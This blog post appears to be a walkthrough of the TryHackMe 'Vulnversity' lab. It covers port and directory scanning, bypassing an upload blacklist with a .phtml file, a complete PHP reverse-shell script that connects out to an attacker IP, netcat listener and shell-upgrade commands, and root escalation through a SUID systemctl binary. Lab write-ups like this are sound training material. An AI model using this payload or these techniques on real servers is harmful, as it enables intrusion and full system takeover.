---
layout: single
title: Vulnversity
date: 2023-08-12 
classes: wide
excerpt: "Solving Vulnversity, the first room in the Offensive Pentesting learning path from TryHackMe"
header:
  teaser: /assets/images/tryhackme/vulnversity/teaser.png
  teaser_home_page: true
categories:
  - machines
tags:
  - tryhackme 
  - LFI
  - fileupload
  - suid
  - php
---

# Introduction


Vulnversity is the first section of TryHackMe's Offensive Pentesting learning path. I'll walk you through all the necessary steps to complete this section, but I won't give away the exact answers. I encourage everyone to follow along and discover the flags on your own as you go through it.

![Vulnversity](/assets/images/tryhackme/vulnversity/teaser.png)


# Reconnaissance

Since the IP address is already given to us, the first thing we need to do is discover which ports are open in the machine. **Nmap** will be our tool of choice for this task,
lets run the following command: 


```bash
sudo namp -p- --open -sS --min-rate 5000 -vvv -n -Pn [ip_address] -oG allPorts
```

Results:


![allPorts](/assets/images/tryhackme/vulnversity/01 allPortsScan.png)


Now we know that the ports 21,22,139,445,3128,3333 are open. Let's get some more detailed information about this ports. We will use a script created by **S4vitar** which 
extracts the ports from the output file of the previous scan. 


![extractedPorts](/assets/images/tryhackme/vulnversity/02 extractedPorts.png)


This utility displays discovered ports and copies them to the clipboard. Now we can use nmap again to discover which services are running on each port: 


```bash
nmap -sCV -p21,22,139,445,3128,3333 [ip_address] -oN extractedPorts
```

Results:


![specificPortsScan](/assets/images/tryhackme/vulnversity/03 specificPortsScan.png)
![hostScriptResults](/assets/images/tryhackme/vulnversity/04 hostScriptResults.png)


We can see an Apache server for Ubuntu running on port 3333, let's check it out:


![HomePage](/assets/images/tryhackme/vulnversity/05 HomePage.png)


We can't see anything interesting on this first page so it may be possible that we have to discover additional directories. **Gobuster** can help us find out if we have any other
interesting directories when combining it with a wordlist from **Seclists**.


```bash
gobuster dir -u http://[ip_address]:3333 -w /usr/share/Seclists/Discovery/Web-Content/directory-lists-2.3-medium.txt -t 20 
```


![gobuste1](/assets/images/tryhackme/vulnversity/06 subdirectoryInternal.png)


The internal directory seems interesting... Let's see what we it hides:


![internalPage](/assets/images/tryhackme/vulnversity/07 InternalPage.png)


# Explotation

Well, this definitely smells like a **File Upload Vulnerability**. We can see that the file extension for the index page is *.php*, and the **Wappalyzer** extension
also detects that the site is running *php*. So let's test upload a *.php* file: 


![ExtensionNotAllowed](/assets/images/tryhackme/vulnversity/08 ExtensionNotAllowed.png)


Hmmm... no luck. It seems like the site has blacklisted certain extensions, but we can still try alternate *php* extensions such as:

- php3
- php4
- php5
- phtml

To make testing easier, we can use burpsuite to intercept the file upload request and check how it responds to the different extensions. You can use intruder to generate
a payload list in the "filename" parameter, but I will just use the repeater to test since it should be a short list: 


![phtmlSuccess](/assets/images/tryhackme/vulnversity/10 phtmlSuccess.png)


Success! The site seems to accept *.phtml* extensions. We can upload a malicious file with a payload that executes when we try to access it on the website. Use the following
code replacing the ip and port variables with your own ip address and port in which you will have your listener setup:


```php
<?php

set_time_limit (0);
$VERSION = "1.0";
$ip = '10.6.84.126';  // CHANGE THIS
$port = 443;       // CHANGE THIS
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;

if (function_exists('pcntl_fork')) {
	// Fork and have the parent process exit
	$pid = pcntl_fork();
	
	if ($pid == -1) {
		printit("ERROR: Can't fork");
		exit(1);
	}
	
	if ($pid) {
		exit(0);  // Parent exits
	}

	// Make the current process a session leader
	// Will only succeed if we forked
	if (posix_setsid() == -1) {
		printit("Error: Can't setsid()");
		exit(1);
	}

	$daemon = 1;
} else {
	printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
}

// Change to a safe directory
chdir("/");

// Remove any umask we inherited
umask(0);

//
// Do the reverse shell...
//

// Open reverse connection
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
	printit("$errstr ($errno)");
	exit(1);
}

// Spawn shell process
$descriptorspec = array(
   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
   2 => array("pipe", "w")   // stderr is a pipe that the child will write to
);

$process = proc_open($shell, $descriptorspec, $pipes);

if (!is_resource($process)) {
	printit("ERROR: Can't spawn shell");
	exit(1);
}

// Set everything to non-blocking
// Reason: Occsionally reads will block, even though stream_select tells us they won't
stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);

printit("Successfully opened reverse shell to $ip:$port");

while (1) {
	// Check for end of TCP connection
	if (feof($sock)) {
		printit("ERROR: Shell connection terminated");
		break;
	}

	// Check for end of STDOUT
	if (feof($pipes[1])) {
		printit("ERROR: Shell process terminated");
		break;
	}

	// Wait until a command is end down $sock, or some
	// command output is available on STDOUT or STDERR
	$read_a = array($sock, $pipes[1], $pipes[2]);
	$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

	// If we can read from the TCP socket, send
	// data to process's STDIN
	if (in_array($sock, $read_a)) {
		if ($debug) printit("SOCK READ");
		$input = fread($sock, $chunk_size);
		if ($debug) printit("SOCK: $input");
		fwrite($pipes[0], $input);
	}

	// If we can read from the process's STDOUT
	// send data down tcp connection
	if (in_array($pipes[1], $read_a)) {
		if ($debug) printit("STDOUT READ");
		$input = fread($pipes[1], $chunk_size);
		if ($debug) printit("STDOUT: $input");
		fwrite($sock, $input);
	}

	// If we can read from the process's STDERR
	// send data down tcp connection
	if (in_array($pipes[2], $read_a)) {
		if ($debug) printit("STDERR READ");
		$input = fread($pipes[2], $chunk_size);
		if ($debug) printit("STDERR: $input");
		fwrite($sock, $input);
	}
}

fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);

function printit ($string) {
	if (!$daemon) {
		print "$string\n";
	}
}

?> 
```


Setup your listener with


```bash
nc -nlvp 443
```


Great, we have everything setup. But... were is the file located in the website? We only discovered the *internal* directory, not the uploaded files directory. We didn't get
any other interesting directory at root of the page so let's check if the *internal* directory is hiding subdirectories: 


```bash
gobuster dir -u http://[ip_address]:3333/internal -w /usr/share/Seclists/Discovery/Web-Content/directory-lists-2.3-medium.txt -t 20
```

![uploadDirectory](/assets/images/tryhackme/vulnversity/11 uploadDirectory.png)


*/uploads* looks promising. If we navigate to http://[ip address]:3333/internal/uploads/php-reverse-shell.phtml, our listener recieves a shell:


![reverseShell](/assets/images/tryhackme/vulnversity/12 ReverseShell.png)


You can use the folowing commands to get an interactive bash shell instead of the one that we recieve by default in nc:


```bash
script /dev/null -c bash
^Z #control + z
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=bash
stty rows 43 columns 183 #use stty size command in another window to determine your rows and columns size
```

![tty](/assets/images/tryhackme/vulnversity/13 TratamientoTty.png)


# Privilege Escalation


By using the following command we can search for files with suid permission enabled and that are owned by the root user:


```bash
find / -user root -perm -4000 2>&1 | grep -v "Permission" | grep -v "No such"
```


![suid](/assets/images/tryhackme/vulnversity/14 suid.png)


The systemctl binary has suid permission enabled and is owned by root, this gives us the ability to create a malicious service that tries to connect to our machine
on startup. Therefore, we will create another listener with **nc** on another port. The service will be stored in a file named as *[service-name].service* and will contain
the following structure:


![rootService](/assets/images/tryhackme/vulnversity/15 RootService.png)


Remember to replace the ip address and port numbers with your own. Now we can enable and start the service (don't use a relative path for the service):


```bash
systemctl enable /tmp/root.service
systemctl start root
```


![rooted](/assets/images/tryhackme/vulnversity/16 Rooted.png)


PWNED! We can now retrieve the flag from the root's home directory:


![flag](/assets/images/tryhackme/vulnversity/17 Flag.png)





